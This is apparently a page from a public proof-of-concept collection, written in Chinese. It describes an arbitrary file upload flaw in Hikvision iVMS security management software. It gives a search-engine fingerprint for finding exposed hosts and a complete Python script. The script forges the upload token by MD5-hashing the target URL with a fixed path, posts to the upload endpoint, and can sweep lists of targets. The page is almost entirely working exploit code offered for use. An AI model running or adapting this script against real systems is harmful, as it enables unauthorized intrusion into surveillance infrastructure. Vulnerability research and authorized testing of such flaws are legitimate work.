## 海康威视iVMS综合安防系统resourceOperations接口任意文件上传漏洞

## 鹰图指纹
```
web.body="/views/home/file/installPackage.rar"
```
![33552763e8f0dc7bf3ee49698486a07d](https://github.com/wy876/POC/assets/139549762/9b75816d-eead-4aef-9411-6cd9ecec938f)

## poc
```python

import requests
import urllib3
import urllib
import hashlib
import argparse
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()


head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
}
def md5encode(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
    else:
        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
    encodetext = url + path
    input_name = hashlib.md5()
    input_name.update(encodetext.encode("utf-8"))
    return (input_name.hexdigest()).upper()

def poc(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/upload?token="
    else:
        path = "/eps/api/resourceOperations/upload?token="
    pocurl = url + path + md5encode(url)
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    try:
        response = requests.post(url=pocurl,headers=head,data=data,verify=False,timeout=3)
        if response.status_code==200:
            print(Fore.GREEN + f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！")
        else:
            print(Fore.RED + f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞")
    except:
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 ivms.py -u http://xxxx\npython3 ivms.py -f file.txt',
                                     description='ivms漏洞检测poc',
                                     )
    p = parser.add_argument_group('ivms 的参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    if args.file:
        for i in open(args.file,"r").read().split("\n"):
            poc(i)
```
![7561a68dd370ef377060f8b033db4842](https://github.com/wy876/POC/assets/139549762/bf160518-070d-4953-ab47-15c5f7786b12)

## 漏洞来源
- https://mp.weixin.qq.com/s/W9cLutTOXjmplVKzEKH9Zg
